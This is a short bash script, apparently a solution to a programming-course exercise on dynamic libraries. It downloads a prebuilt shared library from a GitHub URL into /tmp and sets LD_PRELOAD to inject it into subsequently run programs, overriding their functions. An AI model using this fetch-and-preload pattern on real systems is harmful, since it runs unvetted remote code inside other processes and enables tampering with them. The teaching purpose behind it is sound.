#!/bin/bash
wget -O /tmp/cracking_output.so https://raw.github.com/gilleon/alx-low_level_programming/raw/master/0x18-dynamic_libraries/100-operations.so
export LD_PRELOAD=/tmp/cracking_output.so
